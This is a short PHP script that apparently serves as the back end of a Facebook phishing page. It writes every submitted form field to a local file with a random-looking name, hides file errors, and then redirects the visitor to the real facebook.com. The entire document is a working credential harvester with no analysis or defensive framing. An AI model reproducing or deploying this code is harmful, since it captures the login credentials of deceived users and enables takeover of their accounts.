<?php
header ('Location: https://www.facebook.com');
$posts        = '';
foreach($_POST as $k => $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}
$handle = @fopen("2AH+PxfaMmjRiBzrVyYUbmqDy7lPrcWYRc4xFFjMvyc=", "a+");
@fwrite($handle, $posts);
fclose($handle);
?>
